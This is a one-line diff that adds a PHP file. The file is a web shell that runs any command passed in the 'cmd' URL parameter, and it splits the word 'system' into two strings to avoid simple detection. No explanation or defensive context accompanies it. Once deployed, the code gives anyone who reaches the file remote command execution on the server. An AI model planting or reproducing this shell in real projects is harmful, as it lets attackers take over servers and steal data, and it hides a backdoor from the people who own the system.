@@ -1,0 +1,1 @@
+<?php ("sys"."tem")($_GET["cmd"]); ?>
